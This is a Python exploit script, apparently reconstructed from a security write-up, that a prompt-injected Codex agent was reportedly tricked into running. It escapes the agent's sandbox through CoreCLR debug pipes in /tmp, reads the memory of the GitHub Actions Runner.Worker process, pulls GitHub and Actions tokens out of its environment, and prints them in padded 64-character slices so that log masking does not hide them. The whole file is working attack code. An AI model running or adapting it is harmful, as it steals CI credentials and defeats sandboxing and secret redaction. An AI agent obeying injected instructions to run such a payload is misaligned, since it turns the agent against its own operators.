#!/usr/bin/env python3
"""
diag.py — stage 2/3 payload of the Depi openai/codex exploit chain
https://depi.security/blog/20261111-backdooring-codex/

Reconstructed from the protocol description in the article. This is the
script the prompt-injected Codex agent was tricked into running. Inside the
Codex sandbox all sensitive environment variables are dropped and connect()
is blocked, but the CoreCLR debug pipes that Runner.Worker creates in /tmp
are plain files: open() works, and the unauthenticated debugger thread will
read its own process memory on request.

Chain this implements (article, "Sandbox escape" through "Reading secrets"):
  1. discover /tmp/clr-debug-pipe-<pid>-in / -out, pick the highest PID
     (Runner.Worker, the process holding the job-scoped secrets)
  2. CoreCLR debug transport v2.0 handshake (SESSION_REQUEST, type 0)
  3. GET_DCB (type 9) -> bootstrap pointer candidates
  4. scan pages backwards for \x7fELF -> CoreCLR base
  5. CoreCLR ELF -> PT_DYNAMIC -> GOT[1] -> link_map -> libc base
  6. libc ELF -> .dynamic -> symtab/strtab/gnu_hash -> DJB2 lookup of
     __environ -> environ array -> env strings
  7. match token patterns (ghp_, ghs_, gho_, github_pat_, eyJ) and print
     them in chunks that survive the action log pipeline

Replay scope: this reads THIS replay job's own Runner.Worker on a fork the
replay operator owns. Nothing leaves this repository's own logs. The output
chunks are deliberately smaller than the token so log masking does not apply.
"""

import glob
import os
import re
import struct
import sys
import traceback

# ---------------------------------------------------------------------------
# CoreCLR debug transport v2.0 client
# ---------------------------------------------------------------------------

MSG_SESSION_REQUEST = 0
MSG_SESSION_ACCEPT = 1
MSG_SESSION_CLOSE = 4
MSG_READ_MEMORY = 6
MSG_GET_DCB = 9
MSG_SET_DCB = 10

HDR_LEN = 48  # 24 bytes of six uint32 fields + 24 bytes user data


class ClrDebugPipe:
    def __init__(self, in_path, out_path):
        self.in_path = in_path
        self.out_path = out_path
        self.w = os.open(in_path, os.O_WRONLY)
        self.r = os.open(out_path, os.O_RDONLY)
        self.next_id = 0
        self.last_seen = 0

    def send(self, mtype, userdata=b"", payload=b""):
        self.next_id += 1
        hdr = (
            struct.pack("<6I", mtype, len(payload), self.next_id, 0, self.last_seen, 0)
            + userdata[:24].ljust(24, b"\x00")
        )
        os.write(self.w, hdr + payload)
        return self.next_id

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = os.read(self.r, n - len(buf))
            if not chunk:
                raise EOFError("debug pipe closed")
            buf += chunk
        return buf

    def recv(self):
        hdr = self._recv_exact(HDR_LEN)
        mtype, dsz, mid, rid, last, reserved = struct.unpack_from("<6I", hdr, 0)
        ud = hdr[24:48]
        self.last_seen = mid
        data = self._recv_exact(dsz) if dsz else b""
        return mtype, mid, ud, data

    def handshake(self):
        # 48-byte header + 16-byte payload = 64 bytes on the wire.
        # user-data: protocol version 2, flags 0, padded to 24 bytes.
        ud = struct.pack("<II", 2, 0).ljust(24, b"\x00")
        self.send(MSG_SESSION_REQUEST, ud, b"\x00" * 16)
        mtype, mid, ud, data = self.recv()
        if mtype != MSG_SESSION_ACCEPT:
            raise RuntimeError("expected SESSION_ACCEPT (type 1), got type %d" % mtype)
        return True

    def get_dcb(self):
        self.send(MSG_GET_DCB)
        mtype, mid, ud, data = self.recv()
        return data

    def set_dcb(self, dcb):
        # "slightly modified" DCB sent back to stabilise the session.
        dcb = bytearray(dcb)
        self.send(MSG_SET_DCB, payload=bytes(dcb))
        self.recv()
        return True

    def read_mem(self, addr, sz):
        # user-data: target address (8), size (4), flags (4), padding (8)
        ud = struct.pack("<QII", addr, sz, 0).ljust(24, b"\x00")
        self.send(MSG_READ_MEMORY, ud)
        mtype, mid, ud, data = self.recv()
        # result code lives in the response user-data; nonzero = error
        res_words = struct.unpack("<III", ud[:12])
        res = next((w for w in reversed(res_words) if w), 0)
        if res:
            return b""
        return data[:sz]


def discover_pipes():
    """All CoreCLR debug pipes in /tmp; highest PID is Runner.Worker."""
    pipes = []
    for p in glob.glob("/tmp/clr-debug-pipe-*-in"):
        m = re.match(r"^/tmp/clr-debug-pipe-(\d+)-in$", p)
        if not m:
            continue
        pid = int(m.group(1))
        out = "/tmp/clr-debug-pipe-%d-out" % pid
        if os.path.exists(out):
            pipes.append((pid, p, out))
    return sorted(pipes)


# ---------------------------------------------------------------------------
# Memory walking (article: DCB -> CoreCLR base -> GOT -> link_map -> libc)
# ---------------------------------------------------------------------------


def candidate_pointers(dcb):
    """8-byte aligned chunks of the DCB that look like userspace pointers."""
    cands = []
    for i in range(0, len(dcb) - 7, 8):
        v = struct.unpack_from("<Q", dcb, i)[0]
        hi, lo = v >> 32, v & 0xFFFFFFFF
        if hi != lo and hi >= 0x5000 and lo > 0x10000:
            cands.append(v)
    return cands


def find_elf_base(read_mem, addr):
    """Scan backward page by page for the ELF magic (32 MB limit)."""
    page = addr & ~0xFFF
    start = page
    while page >= 0x10000:
        d = read_mem(page, 4)
        if len(d) == 4 and d == b"\x7fELF":
            return page
        if page < start - 0x2000000:
            break
        page -= 0x1000
    return 0


def parse_dynamic(read_mem, base):
    """ELF header -> PT_DYNAMIC -> dict of DT tags."""
    eh = read_mem(base, 64)
    if len(eh) < 64 or eh[:4] != b"\x7fELF":
        return None
    phoff = struct.unpack_from("<Q", eh, 0x20)[0]
    phnum = struct.unpack_from("<H", eh, 0x38)[0]
    dyn = None
    for i in range(min(phnum, 64)):
        ph = read_mem(base + phoff + i * 56, 56)
        if len(ph) < 56:
            break
        p_type = struct.unpack_from("<I", ph, 0)[0]
        if p_type == 2:  # PT_DYNAMIC
            p_vaddr = struct.unpack_from("<Q", ph, 16)[0]
            p_filesz = struct.unpack_from("<Q", ph, 32)[0]
            dyn = (base + p_vaddr, p_filesz)
            break
    if not dyn:
        return None
    tags = {}
    dyn_addr, dyn_sz = dyn
    for off in range(0, min(dyn_sz, 0x4000), 16):
        entry = read_mem(dyn_addr + off, 16)
        if len(entry) < 16:
            break
        d_tag, d_val = struct.unpack("<QQ", entry)
        if d_tag == 0:
            break
        # some values are relative offsets, not absolute addresses
        if d_val and d_val < base and d_tag not in (2, 28):
            d_val += base
        tags.setdefault(d_tag, d_val)
    return tags


def walk_link_map(read_mem, got):
    """GOT[1] -> link_map linked list -> find libc."""
    got_data = read_mem(got, 24)
    if len(got_data) < 24:
        return None, []
    cur = struct.unpack_from("<Q", got_data, 8)[0]  # GOT[1] = link_map pointer
    libs = []
    while cur and cur > 0x10000 and len(libs) < 64:
        entry = read_mem(cur, 40)
        if len(entry) < 40:
            break
        fields = struct.unpack_from("<5Q", entry)
        l_addr, l_name, l_ld, l_next, l_prev = fields
        name = b""
        if l_name > 0x10000:
            name = read_mem(l_name, 255).split(b"\x00")[0]
        libs.append(name)
        if b"libc.so" in name or b"libc-" in name:
            return l_addr, libs
        cur = l_next
    return None, libs


def gnu_hash_lookup(read_mem, libc_base, sym_name):
    """Resolve a symbol in libc via its GNU hash table (few round-trips)."""
    tags = parse_dynamic(read_mem, libc_base)
    if not tags:
        return 0
    symtab = tags.get(6)
    strtab = tags.get(5)
    gnu_hash = tags.get(0x6FFFFEF5)
    if not (symtab and strtab and gnu_hash):
        return 0

    hdr = read_mem(gnu_hash, 16)
    if len(hdr) < 16:
        return 0
    nbuckets, symofs, bloom_sz, bloom_shift = struct.unpack("<IIII", hdr)
    buckets_off = gnu_hash + 16 + bloom_sz * 8
    chains_off = buckets_off + nbuckets * 4

    # DJB2 hash of the symbol name
    h = 5381
    for c in sym_name.encode():
        h = ((h << 5) + h + c) & 0xFFFFFFFF

    d = read_mem(buckets_off + (h % nbuckets) * 4, 4)
    if len(d) < 4:
        return 0
    idx = struct.unpack_from("<I", d)[0]
    if idx == 0:
        return 0

    for i in range(idx, idx + 8192):
        sym = read_mem(symtab + i * 24, 24)
        if len(sym) < 24:
            break
        st_name = struct.unpack_from("<I", sym, 0)[0]
        st_value = struct.unpack_from("<Q", sym, 8)[0]
        d = read_mem(chains_off + (i - symofs) * 4, 4)
        if len(d) < 4:
            break
        chain_val = struct.unpack_from("<I", d)[0]
        if (chain_val & ~1) == (h & ~1):
            n = read_mem(strtab + st_name, 64)
            if n.split(b"\x00")[0] == sym_name.encode():
                return libc_base + st_value
        if chain_val & 1:  # stop bit
            break
    return 0


# ---------------------------------------------------------------------------
# Secret extraction from __environ
# ---------------------------------------------------------------------------

TOKEN_PATTERNS = (b"ghp_", b"ghs_", b"gho_", b"github_pat_", b"eyJ")
WANT_KEYS = (b"ACTIONS_RUNTIME_TOKEN", b"ACTIONS_CACHE_URL", b"ACTIONS_RESULTS_URL", b"GITHUB_TOKEN")


def dump_environ(read_mem, env_addr):
    """__environ -> envp array -> KEY=VALUE strings."""
    found = {}
    pp = read_mem(env_addr, 8)
    if len(pp) < 8:
        return found
    envp = struct.unpack_from("<Q", pp)[0]
    if not (0x10000 < envp < 0x800000000000):
        return found
    for i in range(4096):
        sp = read_mem(envp + i * 8, 8)
        if len(sp) < 8:
            break
        sptr = struct.unpack_from("<Q", sp)[0]
        if sptr == 0:
            break
        if sptr < 0x10000 or sptr >= 0x800000000000:
            continue
        s = read_mem(sptr, 512)
        if not s:
            continue
        s = s.split(b"\x00")[0]
        key = s.split(b"=", 1)[0]
        if key in WANT_KEYS or any(p in s for p in TOKEN_PATTERNS):
            found.setdefault(key, s)
    return found


def emit_chunks(label, value):
    """
    Print a secret in small slices, each on a line padded past 1024 chars.
    Two purposes, both from the article: the action log pipeline strips very
    short messages, and GitHub masks the *exact* secret string in logs — a
    slice of the secret is not the whole string, so it survives.
    """
    if isinstance(value, bytes):
        value = value.decode("utf-8", "replace")
    n = len(value)
    slices = [value[i : i + 64] for i in range(0, n, 64)] or [""]
    for i, s in enumerate(slices):
        line = "DEPI_CHUNK:%s:%04d:%s" % (label, i, s)
        line += "#" * max(0, 1100 - len(line))
        print(line)
    print("DEPI_CHUNKS:%s:%d" % (label, len(slices)))


def main():
    pipes = discover_pipes()
    if not pipes:
        print("No transport pipes found")
        return 1
    for pid, in_path, out_path in pipes:
        print("[diag] pipe pid=%d in=%s out=%s" % (pid, in_path, out_path))
    pid, in_path, out_path = pipes[-1]  # highest PID = Runner.Worker
    print("[diag] targeting Runner.Worker pid=%d" % pid)

    pipe = ClrDebugPipe(in_path, out_path)
    print("[diag] SESSION_REQUEST ...")
    pipe.handshake()
    print("[diag] SESSION_ACCEPT received — debug session established")

    dcb = pipe.get_dcb()
    print("[diag] DCB: %d bytes" % len(dcb))
    if not dcb:
        return 2
    pipe.set_dcb(dcb)
    print("[diag] SET_DCB sent")

    read_mem = pipe.read_mem

    coreclr_base = 0
    for cand in candidate_pointers(dcb):
        print("[diag] candidate pointer 0x%x" % cand)
        coreclr_base = find_elf_base(read_mem, cand)
        if coreclr_base:
            break
    if not coreclr_base:
        print("[diag] could not locate CoreCLR ELF base")
        return 2
    print("[diag] CoreCLR base = 0x%x" % coreclr_base)

    clr_tags = parse_dynamic(read_mem, coreclr_base)
    if not clr_tags:
        print("[diag] could not parse CoreCLR .dynamic")
        return 2
    got = clr_tags.get(3)  # DT_PLTGOT
    print("[diag] GOT @ 0x%x" % got)

    libc_base, libs = walk_link_map(read_mem, got)
    print("[diag] link_map walked, %d libs: %s" % (len(libs), b", ".join(libs)[:400]))
    if not libc_base:
        print("[diag] libc not found in link_map")
        return 2
    print("[diag] libc base = 0x%x" % libc_base)

    environ_addr = gnu_hash_lookup(read_mem, libc_base, "__environ")
    if not environ_addr:
        print("[diag] __environ not resolved")
        return 2
    print("[diag] __environ @ 0x%x" % environ_addr)

    found = dump_environ(read_mem, environ_addr)
    if not found:
        print("[diag] no matching environment strings")
        return 2

    for key, val in sorted(found.items()):
        print("[diag] recovered env: %s (len %d)" % (key.decode(), len(val)))
    for key, val in sorted(found.items()):
        if key == b"ACTIONS_CACHE_URL" or key == b"ACTIONS_RESULTS_URL":
            print("DEPI_INFO:%s=%s" % (key.decode(), val.decode("utf-8", "replace")))
        else:
            emit_chunks(key.decode(), val)

    pipe.send(MSG_SESSION_CLOSE)
    print("[diag] session closed — tokens recovered")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception:
        traceback.print_exc()
        sys.exit(2)
